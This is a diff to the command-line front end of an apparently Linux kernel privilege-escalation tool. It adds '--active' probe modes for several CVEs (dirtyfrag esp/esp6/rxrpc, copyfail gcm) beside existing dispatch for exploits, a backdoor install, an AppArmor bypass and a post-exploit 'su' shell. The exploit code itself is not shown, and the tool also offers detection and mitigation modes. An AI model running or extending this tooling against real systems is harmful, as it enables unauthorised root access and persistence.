@@ -79,6 +79,11 @@ static void usage(const char *prog)
 "  --help                 this message\n"
 "\n"
 "Options:\n"
+"  --active               in --scan / --check-* mode, do an active sentinel\n"
+"                         STORE probe per CVE in addition to precondition\n"
+"                         checks. Modifies /tmp sentinels only; never\n"
+"                         touches /etc/passwd. Requires AA bypass on\n"
+"                         hardened distros, so may take ~5-10s.\n"
 "  --no-shell             after a successful exploit, do NOT execve `su`;\n"
 "                         instead revert the page-cache patch and exit\n"
 "  --no-color             disable ANSI color in output\n"
@@ -142,6 +147,10 @@ int main(int argc, char **argv)
             else if (strcmp(inner, "esp6")             == 0) r = dirtyfrag_esp6_exploit_inner();
             else if (strcmp(inner, "rxrpc")            == 0) r = dirtyfrag_rxrpc_exploit_inner();
             else if (strcmp(inner, "gcm")              == 0) r = copyfail_gcm_exploit_inner();
+            else if (strcmp(inner, "esp-probe")        == 0) r = dirtyfrag_esp_active_probe_inner();
+            else if (strcmp(inner, "esp6-probe")       == 0) r = dirtyfrag_esp6_active_probe_inner();
+            else if (strcmp(inner, "rxrpc-probe")      == 0) r = dirtyfrag_rxrpc_active_probe_inner();
+            else if (strcmp(inner, "gcm-probe")        == 0) r = copyfail_gcm_active_probe_inner();
             else if (strcmp(inner, "backdoor-install") == 0) r = backdoor_install_inner();
             else if (strcmp(inner, "backdoor-cleanup") == 0) r = backdoor_cleanup_inner();
             else {
@@ -175,6 +184,7 @@ int main(int argc, char **argv)
         {"cleanup-backdoor",  no_argument, NULL, 14 },
         {"mitigate",          no_argument, NULL, 15 },
         {"cleanup-mitigate",  no_argument, NULL, 16 },
+        {"active",            no_argument, NULL, 17 },
         {"no-shell",         no_argument, NULL, 'n'},
         {"no-color",         no_argument, NULL, 'C'},
         {"aa-bypass",        no_argument, NULL,  8 },
@@ -202,6 +212,7 @@ int main(int argc, char **argv)
             case 14 :  m = MODE_CLEANUP_BACKDOOR; break;
             case 15 :  m = MODE_MITIGATE;         break;
             case 16 :  m = MODE_CLEANUP_MITIGATE; break;
+            case 17 :  dirtyfail_active_probes = true; break;
             case 'n':  do_shell = false;          break;
             case 'C':  dirtyfail_use_color = false; break;
             case  8 :  aa_bypass = true;          break;
